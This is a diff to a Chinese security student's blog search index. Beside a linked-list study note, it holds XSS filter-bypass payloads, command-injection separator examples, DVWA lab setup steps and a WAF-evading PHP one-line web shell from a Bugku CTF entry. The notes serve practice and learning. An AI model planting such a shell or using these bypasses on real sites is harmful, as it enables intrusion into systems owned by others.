@@ -1,6 +1,264 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>链表</title>
+    <url>/2020/04/30/%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<h1 id="数组和链表的区别"><a href="#数组和链表的区别" class="headerlink" title="数组和链表的区别"></a>数组和链表的区别</h1><table>
+<thead>
+<tr>
+<th></th>
+<th>数组</th>
+<th>链表</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>内存存储空间</td>
+<td>需要<strong>连续</strong>的内存空间来存储</td>
+<td>通过指针将一组<strong>零散</strong>的内存块串联使用</td>
+</tr>
+<tr>
+<td>插入、删除数据</td>
+<td><strong>缺：</strong>为了保持数据连续性，要做大量数据搬移。时间复杂度为：<strong>O(n)</strong></td>
+<td><strong>优：</strong>只需考虑相邻结点的指针改变。时间复杂度为：<strong>O(1)</strong></td>
+</tr>
+<tr>
+<td>访问</td>
+<td><strong>优：</strong>可以<strong>随机访问</strong>第k个元素。时间复杂度为：<strong>O(1)</strong></td>
+<td><strong>缺：</strong>要<strong>遍历</strong>结点来找到目标结点。时间复杂度为：<strong>O(n)</strong></td>
+</tr>
+<tr>
+<td>CPU缓存机制</td>
+<td><strong>优：</strong>因为数组是连续的内存空间，可以借助CPU缓存机制，预读数组中的数据，<strong>访问数据效率更高</strong>。</td>
+<td><strong>缺：</strong>不可以借助CPU缓存机制</td>
+</tr>
+<tr>
+<td>大小固定</td>
+<td><strong>缺：</strong>大小<strong>固定</strong>，改变大小需要将原来所有数据再复制过去，非常费时。</td>
+<td><strong>优：</strong>支持动态扩容。</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>对于CPU缓存机制【转】</p>
+<p>CPU在从内存读取数据的时候，会先把读取到的数据加载到CPU的缓存中。而CPU每次从内存读取数据并不是只读取那个特定要访问的地址，而是读取一个<strong>数据块</strong>(这个大小我不太确定。。)并保存到CPU缓存中，然后下次访问内存数据的时候就会先从CPU缓存开始查找，如果找到就不需要再从内存中取。这样就实现了比内存访问速度更快的机制，也就是CPU缓存存在的意义:为了弥补内存访问速度过慢与CPU执行速度快之间的差异而引入。</p>
+<p>对于数组来说，存储空间是连续的，所以在加载某个下标的时候可以把以后的几个下标元素也加载到CPU缓存这样执行速度会快于存储空间不连续的链表存储。</p>
+</blockquote>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/7.jpg" alt="7"></p>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/5.jpg" alt="5"></p>
+<h1 id="几种链表"><a href="#几种链表" class="headerlink" title="几种链表"></a>几种链表</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/6.jpg" alt="6"></p>
+<p>头结点用来记录链表的基地址，尾结点指向一个空地址NULL</p>
+<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/4.jpg" alt="4"></p>
+<p>循环链表的尾结点指向链表的头结点</p>
+<h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点：</strong></h3><p>适合处理具有环形结构的数据</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>约瑟夫问题</p>
+<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/3.jpg" alt="3"></p>
+<p>比单链表多了一个prev前驱节点</p>
+<p><strong>优点：</strong>支持双向遍历</p>
+<p><strong>缺点：</strong>占用过多内存空间</p>
+<blockquote>
+<p>双向链表采用了<strong>用空间换时间</strong>的策略</p>
+</blockquote>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="链表中的删除操作"><a href="#链表中的删除操作" class="headerlink" title="链表中的删除操作"></a>链表中的删除操作</h4><h5 id="删除结点中“值等于某个给定值”的结点"><a href="#删除结点中“值等于某个给定值”的结点" class="headerlink" title="删除结点中“值等于某个给定值”的结点"></a>删除结点中“值等于某个给定值”的结点</h5><p>单链表和双向链表都要遍历，时间复杂度均为：O(n)。</p>
+<h5 id="删除给定指针指向的结点"><a href="#删除给定指针指向的结点" class="headerlink" title="删除给定指针指向的结点"></a>删除给定指针指向的结点</h5><p>单链表：找到了要删除的结点，但不支持访问前驱节点，又要从头遍历，直到p-&gt;next=q 。时间复杂度：O(n)。</p>
+<p>双向链表：找到了要删除的结点，直接用前驱节点删除。时间复杂度：O(1)。</p>
+<h4 id="链表中的查询操作【对于有序链表】"><a href="#链表中的查询操作【对于有序链表】" class="headerlink" title="链表中的查询操作【对于有序链表】"></a>链表中的查询操作【对于有序链表】</h4><p>双向链表可以通过数据的大小决定往前还是往后查询，省去一半的时间。</p>
+<h2 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/2.jpg" alt="2"></p>
+<h1 id="链表的实际应用场景"><a href="#链表的实际应用场景" class="headerlink" title="链表的实际应用场景"></a>链表的实际应用场景</h1><p>几种缓存淘汰机制</p>
+<ol>
+<li>先进先出【FIFO：First In，First Out】</li>
+<li>最少使用策略【LFU：Least Frequently Used】</li>
+<li>最近最少使用策略【LRU：Least Recently Used】</li>
+</ol>
+<h2 id="LRU缓存淘汰算法【转】"><a href="#LRU缓存淘汰算法【转】" class="headerlink" title="LRU缓存淘汰算法【转】"></a>LRU缓存淘汰算法【转】</h2><p>如何基于链表实现 LRU 缓存淘汰算法？</p>
+<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的【老数据】。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
+<ol>
+<li>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</li>
+<li>如果此数据没有在缓存链表中，又可以分为两种情况：</li>
+</ol>
+<p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
+<p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
+<p>这样我们就用链表实现了一个 LRU 缓存，是不是很简单？</p>
+<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为 O(n)。</p>
+<p>实际上，我们可以继续优化这个实现思路，比如引入散列表（Hash table）来记录每个数据的位置，将缓存访问的时间复杂度降到 O(1)。因为要涉及我们还没有讲到的数据结构，所以这个优化方案，我现在就不详细说了，等讲到散列表的时候，我会再拿出来讲。</p>
+<h1 id="链表代码的书写技巧"><a href="#链表代码的书写技巧" class="headerlink" title="链表代码的书写技巧"></a>链表代码的书写技巧</h1><h2 id="警惕指针丢失和内存泄漏"><a href="#警惕指针丢失和内存泄漏" class="headerlink" title="警惕指针丢失和内存泄漏"></a>警惕指针丢失和内存泄漏</h2><p>错误样例</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next=x;</span><br><span class="line">x-&gt;next=p-&gt;next;<span class="comment">//这句相当于把x的值赋给x</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用哨兵简化实现难度"><a href="#利用哨兵简化实现难度" class="headerlink" title="利用哨兵简化实现难度"></a>利用哨兵简化实现难度</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>如果要在p结点后面插入一个新的结点</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_node -&gt; next = p -&gt; next;</span><br><span class="line">p -&gt; next = new_node;</span><br></pre></td></tr></table></figure>
+
+<p>特殊情况：向空链表插入第一个结点</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(head==null)&#123;</span><br><span class="line">    head = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>单链表的结点删除操作</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
+
+<p>特殊情况：删除最后一个结点</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next==null)&#123;</span><br><span class="line">    head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>可以看出，无论是插入还是删除都需要考虑特殊情况，比较麻烦。</p>
+<p>这是可以考虑引入<strong>哨兵</strong>。</p>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/8.jpg" alt="8"></p>
+<p>我们让head一直指向这个哨兵结点，哨兵结点内不存储任何数据，我们把这种链表称为<strong>带头链表</strong>。</p>
+<p>在这种情况下，我们插入、删除都可以利用上面的一般表达式。</p>
+<h2 id="重点留意边界条件处理"><a href="#重点留意边界条件处理" class="headerlink" title="重点留意边界条件处理"></a>重点留意边界条件处理</h2><ol>
+<li>如果链表为空</li>
+<li>如果链表只包含一个结点</li>
+<li>如果链表只包含两个结点</li>
+<li>代码逻辑在处理头结点和尾结点时</li>
+</ol>
+<h2 id="多写多练"><a href="#多写多练" class="headerlink" title="多写多练"></a>多写多练</h2><ul>
+<li>单链表反转</li>
+<li>链表中环的检测</li>
+<li>两个有序链表的合并</li>
+<li>删除链表倒数第n个结点</li>
+<li>求链表的中间结点</li>
+</ul>
+]]></content>
+      <categories>
+        <category>数据结构与算法之美</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2020/03/19/XSS/</url>
+    <content><![CDATA[<h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="html实体字符及"><a href="#html实体字符及" class="headerlink" title="html实体字符及"></a>html实体字符及<svg/></h4><p>如果过滤()、[]和``</p>
+<p>则可以使用html实体字符代替括号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert &amp;#40; 1 &amp;#41;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;alert &amp;#40; 1 &amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一个必须要加<svg>标签，第二个可不加（我寻思可能是第一个不在标签里面）。</svg></p>
+<h4 id="闭合注释"><a href="#闭合注释" class="headerlink" title="闭合注释"></a>闭合注释</h4><p>闭合注释</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--   --&gt;</span><br><span class="line">&lt;!--   --!&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="换行过滤"><a href="#换行过滤" class="headerlink" title="换行过滤"></a>换行过滤</h4><p>对于</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input &#x3D; input.replace(&#x2F;auto|on.*&#x3D;|&gt;&#x2F;ig, &#39;_&#39;)</span><br><span class="line">  return &#96;&lt;input value&#x3D;1 $&#123;input&#125; type&#x3D;&quot;text&quot;&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可使用<strong>换行绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">src&#x3D;1 type&#x3D;image onerror</span><br><span class="line">&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h4><p>对于</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi</span><br><span class="line"></span><br><span class="line">  input &#x3D; input.replace(stripTagsRe, &#39;&#39;)</span><br><span class="line">  return &#96;&lt;article&gt;$&#123;input&#125;&lt;&#x2F;article&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可利用浏览器的兼容性直接输入未闭合标签</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>留一个没有解决的小问题，为什么此题不能用换行绕过？</p>
+<p>我猜是因为const的缘故？</p>
+</blockquote>
+<h4 id="style闭合"><a href="#style闭合" class="headerlink" title="style闭合"></a>style闭合</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src &#x3D; src.replace(&#x2F;&lt;\&#x2F;style&gt;&#x2F;ig, &#39;&#x2F;* \u574F\u4EBA *&#x2F;&#39;)</span><br><span class="line">  return &#96;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我先试了下老书上的方法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;BODY&#123;background:url(&quot;javascript:alert(1)&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>失败了。</p>
+<p>于是</p>
+<ol>
+<li><p>   多一个空格</p>
+</li>
+<li><pre><code>&lt;/style
+&gt;</code></pre><blockquote>
+<p>不知道为啥这里又可以换行了</p>
+</blockquote>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>web安全漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>命令执行/代码执行</title>
+    <url>/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
+<li><p><strong>command1 &amp; command2 ：</strong></p>
+<p>不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入）</p>
+</li>
+<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
+<p>先执行command1执行成功后才会执行command2</p>
+</li>
+<li><p><strong>command1 | command2 ：</strong></p>
+<p>只执行command2</p>
+</li>
+<li><p><strong>command1 || command2 ：</strong></p>
+<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
+</li>
+</ul>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
+<li><p>;   前面的执行完执行后面的    </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>|   管道符，显示后面的执行结果  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>||  当前面的执行出错时执行后面的  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 1||whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<blockquote>
+<p><strong>常用url编码</strong> ：<br> %20 = 空格<br> %5c = <br> %26 = &amp;<br> %7c = |</p>
+</blockquote>
+<h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
+<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
+]]></content>
+      <categories>
+        <category>web安全漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>在kali-linux下搭建DVWA</title>
+    <url>/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/</url>
+    <content><![CDATA[<p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
+<ol>
+<li><p>解压压缩包到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
+
+<p>并重命名为dvwa</p>
+</li>
+<li><p>将apache2停止：service apache2 stop</p>
+</li>
+<li><p>给dvwa文件夹相应的权限：chmod -R 755 /var/www/html/dvwa</p>
+</li>
+<li><p>启动mysql服务： service mysql start</p>
+</li>
+<li><p>打开mysql： mysql -u root -p</p>
+</li>
+<li><p>创建数据库：create database dvwa;</p>
+</li>
+<li><pre><code>grant all on dvwa.* to dvwa@localhost identified by &apos;password&apos;;
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   这里划重点：dvwa是dvwa_id，password是dvwa_password.</span><br><span class="line"></span><br><span class="line">8.  退出mysql：exit</span><br><span class="line"></span><br><span class="line">9. 启动apache2服务：service apache2 start</span><br><span class="line"></span><br><span class="line">10.</span><br></pre></td></tr></table></figure>
+ cd /var/www/html/dvwa/config/</code></pre></li>
+<li><p>然后打开config.inc.php修改那个user和password（见7）</p>
+</li>
+<li><p>最后打开浏览器访问127.0.0.1/dvwa即可</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>linux</tag>
+        <tag>杂七杂八</tag>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bugku过狗一句话</title>
     <url>/2020/03/01/bugku%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
     <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">送给大家一个过狗一句话</span><br><span class="line">&lt;?php $poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>
